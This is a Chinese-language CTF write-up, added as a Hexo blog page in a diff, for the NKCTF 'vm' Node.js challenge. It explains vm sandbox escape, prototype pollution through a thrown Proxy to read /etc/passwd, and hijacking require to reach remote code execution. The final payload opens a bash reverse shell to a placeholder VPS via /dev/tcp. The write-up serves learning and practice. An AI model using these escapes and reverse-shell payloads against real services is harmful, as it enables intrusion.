@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>NKCTF-vm | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152531 const express &#x3D; require(&amp;#x27;express&amp;#x27;);2 const bodyParser &#x3D; require(&amp;#x27;body-parser&amp;#x27;);3">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NKCTF-vm">
+<meta property="og:url" content="http://example.com/2024/03/26/NKCTF-vm/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152531 const express &#x3D; require(&amp;#x27;express&amp;#x27;);2 const bodyParser &#x3D; require(&amp;#x27;body-parser&amp;#x27;);3">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-03-26T00:48:22.000Z">
+<meta property="article:modified_time" content="2024-03-26T01:34:51.336Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-NKCTF-vm" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/03/26/NKCTF-vm/" class="article-date">
+  <time class="dt-published" datetime="2024-03-26T00:48:22.000Z" itemprop="datePublished">2024-03-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      NKCTF-vm
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">1 const express = require(&#x27;express&#x27;);</span><br><span class="line">2 const bodyParser = require(&#x27;body-parser&#x27;);</span><br><span class="line">3 const app = express();</span><br><span class="line">4 const fs = require(&quot;fs&quot;);</span><br><span class="line">5 const path = require(&#x27;path&#x27;);</span><br><span class="line">6 const vm = require(&quot;vm&quot;);</span><br><span class="line">7</span><br><span class="line">8 app</span><br><span class="line">9 .use(bodyParser.json())</span><br><span class="line">10 .set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;))</span><br><span class="line">11 .use(express.static(&#x27;public&#x27;))</span><br><span class="line">12</span><br><span class="line">13 app.get(&#x27;/&#x27;, function (req, res)&#123;</span><br><span class="line">14 res.sendFile(__dirname + &#x27;/public/home.html&#x27;);</span><br><span class="line">15 &#125;)</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18 function waf(code) &#123;</span><br><span class="line">19 let pattern = /(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval</span><br><span class="line">|Function)/g;</span><br><span class="line">20 if(code.match(pattern))&#123;</span><br><span class="line">21 throw new Error(&quot;what can I say? hacker out!!&quot;);</span><br><span class="line">22 &#125;</span><br><span class="line">23 &#125;</span><br><span class="line">24</span><br><span class="line">25 app.post(&#x27;/&#x27;, function (req, res)&#123;</span><br><span class="line">26 let code = req.body.code;</span><br><span class="line">27 let sandbox = Object.create(null);</span><br><span class="line">28 let context = vm.createContext(sandbox);</span><br><span class="line">29 try &#123;</span><br><span class="line">30 waf(code)</span><br><span class="line">31 let result = vm.runInContext(code, context);</span><br><span class="line">32 console.log(result);</span><br><span class="line">33 &#125; catch (e)&#123;</span><br><span class="line">34 console.log(e.message);</span><br><span class="line">35 require(&#x27;./hack&#x27;);</span><br><span class="line">36 &#125;</span><br><span class="line">37 &#125;)</span><br><span class="line">38</span><br><span class="line">39 app.get(&#x27;/secret&#x27;, function (req, res)&#123;</span><br><span class="line">40 if(process.__filename == null) &#123;</span><br><span class="line">41 let content = fs.readFileSync(__filename, &quot;utf-8&quot;);</span><br><span class="line">42 return res.send(content);</span><br><span class="line">43 &#125; else &#123;</span><br><span class="line">44 let content = fs.readFileSync(process.__filename, &quot;utf-8&quot;);</span><br><span class="line">45 return res.send(content);</span><br><span class="line">46 &#125;</span><br><span class="line">47 &#125;)</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50 app.listen(3000, ()=&gt;&#123;</span><br><span class="line">51 console.log(&quot;listen on 3000&quot;);</span><br><span class="line">52 &#125;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>vm逃逸</strong></p>
+<p>防止变量的污染，VM的特点就是不受环境的影响，也可以说他就是一个 沙箱环境 （沙箱模式给模块提供一个环境运行而不影响其它模块和它们私有的沙箱）。 </p>
+<p>如果我们正常执行命令的话是怎么执行的呢，一般都是通过child_process模块，而在沙箱中又不能直接通过require引入child_process，而require的话是可以从process对象中进行获取的，所以这里最终要获取的其实就是process模块，一般都是如下获取 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const vm = require(&#x27;vm&#x27;);</span><br><span class="line">const y1 = vm.runInNewContext(`this.toString.constructor(&quot;return process&quot;)();`);</span><br><span class="line">console.log(y1.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;));</span><br></pre></td></tr></table></figure>
+
+<p>如果在runInNewContext想要通过逃逸的话可以通过<code>this.constructor.constructor(&quot;return process&quot;)()</code> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const vm = require(&#x27;vm&#x27;);</span><br><span class="line">const result = vm.runInNewContext(`this.constructor.constructor(&quot;return process&quot;)()`);</span><br><span class="line">result.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>具体的原因就是在this这个位置上，this指向context（上面的代码中就是默认vm创建的context）并通过原型链的方式拿到Funtion </p>
+<hr>
+<p>&#x2F;secret 中对 process.__filename 有一个判断，正常情况下，process 是没有 __<br>filename 这个属性的，猜测这里可以原型链污染</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1 throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">2 get: function()&#123;</span><br><span class="line">3 const cc = arguments.callee.caller;</span><br><span class="line">4 cc.__proto__.__proto__.__filename = &quot;/etc/passwd&quot;;</span><br><span class="line">5 &#125;</span><br><span class="line">6 &#125;)</span><br></pre></td></tr></table></figure>
+
+<p>这样就污染了 Object 的__filename 属性，process 因为找不到__filename 这个属性，就会到<br>prototype 里去找，最终在 Object 找到这个属性，观察源码可以发现 require(‘.&#x2F;hack’) ，<br>污染 process.__filename 为 &#x2F;app&#x2F;hack.js ，访问 &#x2F;secret，读取到 hack.js 的内容为 : </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 console.log(&#x27;shell.js&#x27;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 console.log(&quot;shell&quot;);</span><br><span class="line">2 const p = require(&#x27;child_process&#x27;);</span><br><span class="line">3 p.execSync(process.env.command);</span><br></pre></td></tr></table></figure>
+
+<p>这里很明显 process.env.command 也能进行污染控制，问题是怎么 include shell.js，漏洞点 </p>
+<p>在 require(‘&#x2F;hack’) ，打断点进入 require 方法调试，可以发现里面可以通过原型链污染控 </p>
+<p>制某些属性的值，可以达到任意文件包含的效果，调试过程可以参考 <a target="_blank" rel="noopener" href="https://hujiekang.top/p">https://hujiekang.top/p</a> </p>
+<p>osts&#x2F;nodejs-require-rce&#x2F;，我们构造 payload 包含 shell.js，就可以 rce 了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1 throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">2 get: function()&#123;</span><br><span class="line">3 const cc = arguments.callee.caller;</span><br><span class="line">4 cc.__proto__.__proto__.data = &#123;&quot;name&quot;: &quot;./hack&quot;,&quot;exports&quot;: </span><br><span class="line">&quot;./shell.js&quot;&#125;;</span><br><span class="line">5 cc.__proto__.__proto__.path = &quot;/app&quot;;</span><br><span class="line">6 cc.__proto__.__proto__.command = &quot;bash -c &#x27;bash -i &gt;&amp; /dev/</span><br><span class="line">tcp/vps/port 0&gt;&amp;1&#x27;&quot;;</span><br><span class="line">7 &#125;</span><br><span class="line">8 &#125;)</span><br></pre></td></tr></table></figure>
+
+<p>拿到 shell，执行 &#x2F;readflag </p>
+<p>先把wp抄上，还有不理解的地方，找到 [HZNUCTF 2023 final]eznode 练习一下再来研究</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/03/26/NKCTF-vm/" data-id="clu7pilys0001r0b5cw5fhhzz" data-title="NKCTF-vm" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2024/03/25/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">无列名注入</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/html-css-js%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/" rel="tag">html, css, js基础学习</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/html-css-js%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/" style="font-size: 10px;">html, css, js基础学习</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/03/26/NKCTF-vm/">NKCTF-vm</a>
+          </li>
+        
+          <li>
+            <a href="/2024/03/25/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/">无列名注入</a>
+          </li>
+        
+          <li>
+            <a href="/2024/03/17/java%E7%A8%8D%E8%BF%9B%E9%98%B6/">java稍进阶</a>
+          </li>
+        
+          <li>
+            <a href="/2024/03/15/Java%E5%9F%BA%E7%A1%80/">Java基础</a>
+          </li>
+        
+          <li>
+            <a href="/2024/03/12/XXE/">XXE</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
